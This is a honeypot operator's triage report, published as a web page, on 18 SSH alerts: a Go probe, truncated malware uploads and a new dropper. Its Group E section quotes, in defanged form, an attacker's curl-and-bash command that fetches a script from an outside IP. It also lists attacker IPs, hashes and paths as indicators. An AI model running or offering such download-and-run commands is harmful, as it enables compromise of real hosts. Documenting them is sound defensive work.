@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Report: Triage of the 18 open alerts (2026-10-15) - Honeypot Intelligence</title>
+<meta name="description" content="docs/reports/2026-10-15-open-alerts-triage.md">
+<link rel="canonical" href="https://ta1rjv.github.io/honeypot-kb/tr/library/docs/reports/2026-10-15-open-alerts-triage.html">
+<link rel="alternate" hreflang="en" href="https://ta1rjv.github.io/honeypot-kb/library/docs/reports/2026-10-15-open-alerts-triage.html">
+<link rel="alternate" hreflang="tr" href="https://ta1rjv.github.io/honeypot-kb/tr/library/docs/reports/2026-10-15-open-alerts-triage.html">
+<link rel="alternate" hreflang="x-default" href="https://ta1rjv.github.io/honeypot-kb/library/docs/reports/2026-10-15-open-alerts-triage.html">
+<style>
+:root{color-scheme:light dark;--bg:#fafafa;--fg:#1c2128;--muted:#59636e;--card:#fff;--line:#d0d7de;--accent:#0b5cad;--bar:#2f81c4;--warn:#fff4ce;--warnfg:#4a3b00}
+@media (prefers-color-scheme:dark){:root{--bg:#0f141a;--fg:#e6edf3;--muted:#9aa7b4;--card:#161c24;--line:#2b3440;--accent:#6cb2f0;--bar:#4a9be0;--warn:#3a3000;--warnfg:#ffe9a0}}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.6 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+a{color:var(--accent)}
+.skip{position:absolute;left:-999px}.skip:focus{left:8px;top:8px;background:var(--card);padding:4px 8px}
+header.top{background:var(--card);border-bottom:1px solid var(--line)}
+.bar{max-width:62rem;margin:0 auto;padding:.6rem 1rem;display:flex;flex-wrap:wrap;gap:.5rem 1.2rem;align-items:center}
+.brand{font-weight:700;color:var(--fg);text-decoration:none}
+nav.main{display:flex;flex-wrap:wrap;gap:.2rem 1rem;flex:1}
+nav.main a{text-decoration:none;color:var(--muted)}
+nav.main a[aria-current]{color:var(--fg);font-weight:600;border-bottom:2px solid var(--accent)}
+.lang{font-weight:600;white-space:nowrap}
+.lang a{text-decoration:none;color:var(--muted)}
+.lang a[aria-current]{color:var(--fg);border-bottom:2px solid var(--accent)}
+main{max-width:62rem;margin:0 auto;padding:1rem}
+.banner{background:var(--warn);color:var(--warnfg);padding:.5rem 1rem;text-align:center}
+.notice{border-left:4px solid var(--accent);background:var(--card);padding:.5rem 1rem;margin:0 0 1rem}
+table{border-collapse:collapse;width:100%;margin:1rem 0;font-size:.92rem;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:.3rem .6rem;text-align:left;vertical-align:top}
+th{background:var(--card)}td.num{text-align:right;font-variant-numeric:tabular-nums}
+td code,pre,code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.88em}
+td{word-break:break-word}
+pre{background:var(--card);border:1px solid var(--line);padding:.7rem;overflow-x:auto}
+blockquote{margin:1rem 0;padding:.1rem 1rem;border-left:4px solid var(--line);color:var(--muted)}
+span.redacted{background:var(--card);border:1px solid var(--line);border-radius:3px;padding:0 .3em;color:var(--muted);font-style:italic;font-size:.9em;white-space:nowrap}
+svg.chart{width:100%;height:auto;max-width:48rem}
+svg.chart .b{fill:var(--bar)}svg.chart text{fill:var(--muted);font-size:11px}
+footer{max-width:62rem;margin:2rem auto;padding:1rem;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}
+@media (max-width:40rem){body{font-size:15px}}
+</style>
+</head>
+<body>
+<a class="skip" href="#content">İçeriğe geç</a>
+
+<header class="top"><div class="bar">
+<a class="brand" href="../../../index.html">Honeypot Intelligence</a>
+<nav class="main" aria-label="Main"><a href="../../../index.html">Ana sayfa</a><a href="../../../overview.html">Genel bakış</a><a href="../../../architecture.html">Mimari</a><a href="../../../containment.html">Kısıtlama</a><a href="../../../attack-landscape.html">Saldırı manzarası</a><a href="../../../campaigns.html">Kampanyalar</a><a href="../../../indicators.html">Göstergeler</a><a href="../../../intelligence-pipeline.html">İstihbarat hattı</a><a href="../../../operations-history.html">İşletim geçmişi</a><a href="../../../decisions.html">Kararlar</a><a href="../../../research.html">Araştırma</a><a href="../../../glossary.html">Sözlük</a><a href="../../../about.html">Hakkında</a><a href="../../index.html" aria-current="page">Kütüphane</a></nav>
+<nav class="lang" aria-label="Dil"><a href="../../../../library/docs/reports/2026-10-15-open-alerts-triage.html" hreflang="en" lang="en">EN</a> | <a href="2026-10-15-open-alerts-triage.html" hreflang="tr" lang="tr" aria-current="true">TR</a></nav>
+</div></header>
+<main id="content">
+<p class="notice">Bu belge yalnızca İngilizce mevcuttur.</p>
+<div lang="en">
+<h1 id="report-triage-of-the-18-open-alerts-2026-10-15">Report: Triage of the 18 open alerts (2026-10-15)</h1>
+<ul>
+<li>Report date (UTC): 2026-10-15</li>
+<li>Analyst: honeypot-intelligence orchestrator (read-only DB inspection)</li>
+<li>Data source: <code><span class="redacted" lang="tr">[gizlendi]</span></code> opened read-only
+  (<code>mode=ro</code>), extraction 2026-10-15 15:12Z-15:20Z, plus <code>nft list ruleset</code>,
+  <code>host_status_samples</code> and the systemd journal. No captured file was opened
+  or executed. Attacker infrastructure is listed for IoC purposes only.</li>
+<li>Evidence level: MEASURED (live production data).</li>
+<li>Previous triage: docs/reports/2026-10-11-open-alerts-triage.md (Groups B, C,
+  D defined in docs/reports/2026-10-10-open-alerts-triage.md).</li>
+</ul>
+<h2 id="summary">Summary</h2>
+<p>94 alerts in total, 21 new since the last triage (#74-#94). #74-#76 were
+already acknowledged; 18 are open: 9 <code>high</code>, 9 <code>medium</code>, none <code>critical</code>.
+Containment held: <code>cowrie_egress_blocked</code> stayed at 6 packets for the whole
+period, no watchdog event, Cowrie restarts 0.</p>
+<table>
+<thead>
+<tr>
+<th>Group</th>
+<th>Alerts</th>
+<th>Count</th>
+<th>Severity</th>
+<th>Nature</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>B</td>
+<td>#79, #80, #83, #84, #88-#92</td>
+<td>9</td>
+<td>medium</td>
+<td>Go SSH loader <code>filter</code> probe</td>
+<td>REAL, contained, known; no second stage</td>
+</tr>
+<tr>
+<td>D</td>
+<td>#77/#78, #81/#82, #93/#94</td>
+<td>6 (3 sessions)</td>
+<td>high</td>
+<td>SFTP upload <code>sshd</code> (Go SSH worm)</td>
+<td>REAL, contained, known family; 3 new hashes</td>
+</tr>
+<tr>
+<td>E (new)</td>
+<td>#85, #86, #87</td>
+<td>3</td>
+<td>high</td>
+<td><code>kaz.sh</code> download-and-run dropper</td>
+<td>REAL, contained; script never fetched</td>
+</tr>
+</tbody>
+</table>
+<h2 id="group-b-filter-probe-9-medium">Group B - filter probe (9 medium)</h2>
+<p>All 9 sessions run exactly the known 5-command probe (PATH export, <code>printf
+... &gt; filter</code>, run, delete), client <code>SSH-2.0-Go</code>, nothing else. Sources:
+AS47890 UNMANAGED-DEDICATED-SERVERS (92.118.39.14/.49/.50, 80.94.92.55/.234,
+2.57.122.74/.209) and, new for this group, AS48090 DMZHOST - TECHOFF SRV
+LIMITED (195.178.110.228, .232). Detection still yields about one medium
+alert per IP per day; the planned tuning (TODO.md) is still open.</p>
+<h2 id="group-d-sftp-sshd-uploads-6-high-3-sessions">Group D - SFTP <code>sshd</code> uploads (6 high, 3 sessions)</h2>
+<table>
+<thead>
+<tr>
+<th>Alerts</th>
+<th>Created (UTC)</th>
+<th>Source (ASN)</th>
+<th>sha256 (short)</th>
+<th>Size</th>
+<th>Commands</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>#77/#78</td>
+<td>10-12 14:56</td>
+<td>59.185.230.105 (AS17813 MTNL, IN)</td>
+<td><code>94f2e4d8d443</code></td>
+<td>30304472</td>
+<td>1: <code>chmod +x</code> + <code>nohup</code> of the uploaded file (emulated)</td>
+</tr>
+<tr>
+<td>#81/#82</td>
+<td>10-12 22:19</td>
+<td>120.48.53.174 (AS38365 Baidu, CN)</td>
+<td><code>f01cac66a63b</code></td>
+<td>229376</td>
+<td>0</td>
+</tr>
+<tr>
+<td>#93/#94</td>
+<td>10-15 13:54</td>
+<td>118.145.66.151 (AS137718 Volcano Engine, CN)</td>
+<td><code>434b4bd4fa61</code></td>
+<td>1572864</td>
+<td>0</td>
+</tr>
+</tbody>
+</table>
+<p><code>payload_relations</code> shows every Group D hash (old and new) is a byte prefix
+of <code>94f2e4d8d443</code>: one binary, uploaded in truncated pieces as before;
+<code>94f2e4d8d443</code> is the longest copy so far (30.3 MB, previous longest 20 MB).
+ELF64 x86-64, not UPX-packed, entropy 6.15-6.20 like the earlier copies. The
+<code>chmod</code>/<code>nohup</code> in #77 ran inside the Cowrie emulation; nothing executed on
+the host. The pair per session (<code>new_payload</code> + <code>malware_deployment</code>) is the
+expected double alert for an upload.</p>
+<h2 id="group-e-new-kazsh-dropper-85-87">Group E (new) - <code>kaz.sh</code> dropper (#85-#87)</h2>
+<ul>
+<li>Source 181.214.147.38 (AS213772 BK-CUST UAB Baltnetos komunikacijos, geo
+  AE), client <code>SSH-2.0-Go</code>, HASSH <code>0a07365cc01fa9fc82608ba4019af499</code>.</li>
+<li>2026-10-13 11:27:40-11:27:50Z: three sessions in 10 s, each a root login
+  with a different weak password (credential spraying, 3/3 accepted by
+  Cowrie), each sending one command: <code>uname -a</code>, <code>cat /etc/os-release</code>, then
+  <code>curl -fLO hxxp://74[.]113[.]234[.]62:5521/akzmahazcA/kaz.sh &amp;&amp; bash kaz.sh</code>
+  (fallback <code>wget ... kz.sh</code>).</li>
+<li>Result: the fetch was never made. <code>network_connections</code> rows are <code>derived</code>
+  / <code>emulated</code> (parsed from the command text), there is no <code>payload_events</code>
+  row and <code>cowrie_egress_blocked</code> did not change. The script content is
+  therefore unknown.</li>
+<li>No other source used <code>kaz.sh</code> or this URL.</li>
+<li>IoC: <code>74.113.234.62:5521</code>, path <code>/akzmahazcA/kaz.sh</code>, <code>/akzmahazcA/kz.sh</code>.</li>
+</ul>
+</div>
+</main>
+<footer>Veri anlık görüntüsü: 2026-10-21 | Kaynak commit: bceebd0 | Savunma amaçlı araştırma; saldırgan göstergeleri etkisizleştirilmiştir (defang)</footer>
+</body>
+</html>
